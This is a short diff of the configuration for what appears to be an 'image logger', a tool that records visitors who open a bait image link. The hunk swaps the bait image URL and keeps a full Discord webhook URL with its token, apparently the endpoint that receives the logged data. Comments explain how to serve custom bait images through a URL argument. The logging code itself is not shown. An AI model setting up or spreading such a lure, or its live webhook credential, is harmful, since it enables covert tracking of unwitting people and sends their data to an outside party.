@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1466888845672054961/fuP-loU4mWbqdbXKsRcOUZ3WWneLzdx_DvvUCWVHPYkTYZBsaPr-nmCO7A1uWneeUY9U",
-    "image": "https://cdn.memegenerator.es/imagenes/memes/full/32/19/32192322.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%2Fid%2FOIP.x0ww5uNCBo5W6MilSqLoNgHaE8%3Fpid%3DApi&f=1&ipt=b729dfaa533b3154d2d9c80bf87aefdb6d066f86c45065fdd8d5c560ed1ba950&ipo=images", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
